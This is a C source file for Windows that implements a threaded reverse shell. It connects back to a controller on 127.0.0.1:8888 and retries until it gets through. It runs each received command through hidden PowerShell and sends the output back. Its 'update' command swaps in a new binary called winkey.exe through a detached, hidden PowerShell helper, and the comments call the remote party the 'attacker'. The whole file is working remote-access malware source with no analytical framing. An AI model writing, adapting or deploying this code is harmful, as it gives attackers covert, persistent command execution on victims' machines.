#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

DWORD WINAPI    reverse_shell(LPVOID arg)
{
    printf("Program started...\n");

    WSADATA wsadata;
    int wsastart = WSAStartup(MAKEWORD(2,2), &wsadata);
    if (wsastart != 0)
    {
        printf("WSAStartup failed\n");
        return (1);
    }
    else
        printf("WSAStartup Success...\n");

    SOCKET outgoingsock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in routeinfo;
    memset(&routeinfo, 0, sizeof(routeinfo));
    routeinfo.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &routeinfo.sin_addr);
    routeinfo.sin_port = htons(8888);

    int connectionstatus = -1;

    printf("Loop Started...\n");
    while (connectionstatus)
    {
        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &routeinfo.sin_addr, ip_str, INET_ADDRSTRLEN);
        printf("Connecting to %s:%d\n", ip_str, ntohs(routeinfo.sin_port));
        int connecattempt = connect(outgoingsock, (struct sockaddr*)&routeinfo, sizeof(routeinfo));
        if (connecattempt == 0)
        {
            printf("Connection Successful...\n");
            connectionstatus = 0;
        }
        else
        {
            printf("Connection failed, error %d, trying again in 5 seconds..\n", WSAGetLastError());
            closesocket(outgoingsock);
            Sleep(5000);
            outgoingsock = socket(AF_INET, SOCK_STREAM, 0);
        }
    }

    char incominginstructions[2000];

    while (1)
    {
        // Read byte by byte until \n
        int i = 0;
        char c;
        int recv_status = 1;
        while (i < (int)sizeof(incominginstructions) - 1)
        {
            recv_status = recv(outgoingsock, &c, 1, 0);
            if (recv_status <= 0) break;
            if (c == '\n') break;
            incominginstructions[i++] = c;
        }

        if (recv_status <= 0)
            break;

        // Null terminate
        incominginstructions[i] = '\0';

        // Strip trailing \r if client sent \r\n
        if (i > 0 && incominginstructions[i - 1] == '\r')
            incominginstructions[--i] = '\0';

        if (_stricmp(incominginstructions, "exit") == 0)
            break;

        // ────────────────────────────────────────────────────────────
        // UPDATE COMMAND
        // Flow:
        //   1. Receive file size (4 bytes little-endian)
        //   2. Receive binary data
        //   3. Write to temp file
        //   4. Spawn detached PowerShell helper that will:
        //        - wait 2s (so winkey.exe has time to exit)
        //        - replace winkey.exe on disk
        //        - relaunch winkey.exe
        //   5. Notify attacker, close socket, exit thread
        //      → winkey.exe dies, helper takes over
        //      → new winkey.exe reconnects automatically via retry loop
        // ────────────────────────────────────────────────────────────
        if (_stricmp(incominginstructions, "update") == 0)
        {
            // 1. Receive file size (4 bytes)
            unsigned int filesize = 0;
            int r = recv(outgoingsock, (char*)&filesize, sizeof(filesize), MSG_WAITALL);
            if (r <= 0 || filesize == 0 || filesize > 50 * 1024 * 1024)
            {
                char *err = "update: bad file size\n> ";
                send(outgoingsock, err, strlen(err), 0);
                continue;
            }

            // 2. Receive binary data
            char *newbinary = malloc(filesize);
            if (!newbinary)
            {
                char *err = "update: malloc failed\n> ";
                send(outgoingsock, err, strlen(err), 0);
                continue;
            }

            unsigned int received = 0;
            while (received < filesize)
            {
                int chunk = recv(outgoingsock, newbinary + received, filesize - received, 0);
                if (chunk <= 0) break;
                received += (unsigned int)chunk;
            }

            if (received != filesize)
            {
                free(newbinary);
                char *err = "update: incomplete transfer\n> ";
                send(outgoingsock, err, strlen(err), 0);
                continue;
            }

            // 3. Write to temp file
            char tmppath[MAX_PATH];
            GetTempPathA(MAX_PATH, tmppath);
            strncat(tmppath, "winkey_new.exe", MAX_PATH - strlen(tmppath) - 1);

            FILE *f = fopen(tmppath, "wb");
            if (!f)
            {
                free(newbinary);
                char *err = "update: fopen failed\n> ";
                send(outgoingsock, err, strlen(err), 0);
                continue;
            }
            fwrite(newbinary, 1, filesize, f);
            fclose(f);
            free(newbinary);

            // 4. Find winkey.exe path (same directory as current binary)
            char winkey_path[MAX_PATH];
            GetModuleFileNameA(NULL, winkey_path, MAX_PATH);
            char *last_slash = strrchr(winkey_path, '\\');
            if (last_slash)
                strcpy(last_slash + 1, "winkey.exe");

            // 5. Spawn detached PowerShell helper
            //    It waits 2s (winkey dies), replaces binary, relaunches
            char ps_update[MAX_PATH * 4];
            snprintf(ps_update, sizeof(ps_update),
                "powershell.exe -NoProfile -WindowStyle Hidden -Command \""
                "Start-Sleep 2; "
                "Move-Item -Force '%s' '%s'; "
                "Start-Process '%s'"
                "\"",
                tmppath,
                winkey_path,
                winkey_path
            );

            printf("%s %s\n", tmppath, winkey_path);

            STARTUPINFOA si2;
            PROCESS_INFORMATION pi2;
            ZeroMemory(&si2, sizeof(si2));
            ZeroMemory(&pi2, sizeof(pi2));
            si2.cb = sizeof(si2);

            CreateProcessA(NULL, ps_update, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW | DETACHED_PROCESS,
                           NULL, NULL, &si2, &pi2);
            CloseHandle(pi2.hProcess);
            CloseHandle(pi2.hThread);

            // Notify attacker then die cleanly
            char *ok = "update: binary received, reconnect in ~5s...\n";
            send(outgoingsock, ok, strlen(ok), 0);

            closesocket(outgoingsock);
            WSACleanup();
            ExitProcess(0);
        }

        // ────────────────────────────────────────────────────────────
        // NORMAL COMMAND — wrap in PowerShell and pipe output back
        // ────────────────────────────────────────────────────────────

        char pscommand[2300];
        snprintf(pscommand, sizeof(pscommand),
            "powershell.exe -NoProfile -NonInteractive -Command \"%s\"",
            incominginstructions);

        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES sa;
        sa.nLength              = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle       = TRUE;
        sa.lpSecurityDescriptor = NULL;

        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        {
            printf("CreatePipe failed, error %lu\n", GetLastError());
            continue;
        }

        SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb         = sizeof(si);
        si.dwFlags    = STARTF_USESTDHANDLES;
        si.hStdOutput = hWritePipe;
        si.hStdError  = hWritePipe;
        si.hStdInput  = INVALID_HANDLE_VALUE;

        if (!CreateProcess(NULL, pscommand, NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            printf("CreateProcess failed, error %lu\n", GetLastError());
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            continue;
        }

        CloseHandle(hWritePipe);

        char outgoingoutp[8000];
        int total = 0;
        DWORD bytesRead;

        while (total < (int)sizeof(outgoingoutp) - 1)
        {
            if (!ReadFile(hReadPipe, outgoingoutp + total,
                sizeof(outgoingoutp) - 1 - total, &bytesRead, NULL) || bytesRead == 0)
                break;
            total += bytesRead;
        }
        outgoingoutp[total] = '\0';

        CloseHandle(hReadPipe);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (total == 0)
        {
            strcpy(outgoingoutp, "(no output)\n");
            total = strlen(outgoingoutp);
        }

        int total_sent = 0;
        while (total_sent < total)
        {
            int sent = send(outgoingsock, outgoingoutp + total_sent, total - total_sent, 0);
            if (sent <= 0) break;
            total_sent += sent;
        }

        char prompt[] = "\n> ";
        send(outgoingsock, prompt, strlen(prompt), 0);
    }

    closesocket(outgoingsock);
    WSACleanup();
    return (0);
}


void    start_reverse_shell(void)
{
    HANDLE h = CreateThread(
        NULL,
        0,
        reverse_shell,
        NULL,
        0,
        NULL
    );

    if (h == NULL)
    {
        fprintf(stderr, "CreateThread failed\n");
        return;
    }

    CloseHandle(h);
}